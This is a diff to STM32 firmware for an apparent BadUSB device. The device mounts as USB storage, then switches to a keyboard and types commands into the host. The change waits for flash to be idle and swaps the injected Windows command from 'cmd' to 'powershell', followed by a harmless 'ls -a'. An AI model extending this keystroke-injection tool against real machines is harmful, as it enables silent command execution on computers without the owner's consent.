@@ -334,6 +334,7 @@ int main(void)
   /* USER CODE BEGIN 2 */
   int flag = 0;
   isMSC = 1;
+  uint32_t Flash_Busy;
   MX_USB_DEVICE_Init_MSC();
 
   memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
@@ -345,14 +346,19 @@ int main(void)
   /* USER CODE BEGIN WHILE */
   while(1){
 	  InterruptTrap(&InterruptFlag);
+	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 
 	  if(flag == 1){
-		  HAL_Delay(10000); //random slot to switch HID
-		  SwitchToHID();
-		  HAL_Delay(2000); //test Device Manager linux 2000
-		  //Attack begin
-		  BadUSB_Attack(0);
-
+		  HAL_Delay(10000);//random slot to switch HID
+		  while(1){
+			  if(!Flash_Busy){
+				  SwitchToHID();
+				  HAL_Delay(1000); //test Device Manager linux 2000
+				  //Attack begin
+				  BadUSB_Attack(0);
+				  break;
+			  }
+		  }
 		  flag = 0;
 		  SwitchToMSC();
 	  }
@@ -569,8 +575,8 @@ void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 	}else if(type == 1){
 		uint8_t StartWindowsTerminal[2] = {132, 'R'};
 		char AttackStr[256], AttackStr1[256];
-		strcpy(AttackStr, "cmd\n");
-		strcpy(AttackStr1, "ls -a\n\n");
+		strcpy(AttackStr, "powershell\n");
+		strcpy(AttackStr1, "ls -a\n\nexit\n");
 		SimulateShortcutKey(StartWindowsTerminal, 2);
 		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 		HAL_Delay(1000);
